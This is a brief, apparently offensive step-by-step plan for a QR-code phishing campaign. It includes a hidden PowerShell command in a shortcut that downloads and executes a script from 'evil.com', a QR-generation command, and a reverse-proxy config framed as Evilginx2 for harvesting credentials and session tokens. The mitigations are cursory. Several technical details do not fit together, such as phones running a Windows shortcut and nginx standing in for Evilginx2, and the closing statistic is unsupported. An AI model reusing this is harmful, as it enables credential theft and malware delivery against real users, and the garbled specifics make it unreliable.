Campaign flow:
1) Compromise SharePoint site → upload `invoice_20250520.iso` containing `info.lnk` (Windows shortcut `powershell.exe -nop -ep bypass -w hidden -c "$w=New-Object Net.WebClient;$w.DownloadString('http://evil.com/x.ps1') | IEX"`).
2) Generate QR: `qrencode -l H -s 8 -o qr.png "https://files.sharepoint.com/personal/fake_user/_layouts/15/Doc.aspx?sourcedoc=%7B123%7D&file=invoice_20250520.iso"`
3) Place QR on parking meters/cafés; victim scans via phone, browser auto-downloads ISO.
4) Evilginx2 sits at `evil.com`; config:
```nginx
server {
    listen 443 ssl;
    server_name files.sharepoint.com;
    ssl_certificate /etc/letsencrypt/live/evil.com/fullchain.pem;
    location / {
        proxy_pass https://sharepoint.com;
        proxy_set_header Host files.sharepoint.com;
    }
}
```
5) Evilginx2 harvests creds via transparent proxy; session tokens stored in Redis.
6) Post-exploit: inject further payloads via ISO `autorun.inf`.
Mitigation:
- Disable ISO auto-mount Group Policy (`HKLM\...\Policies\Microsoft\Windows\Device Installation\Restrictions`).
- Use MDM to block unknown QR codes.
Real-world: 2023 FluBot QR phishing hit 45,000 UK devices via compromised WordPress blogs.

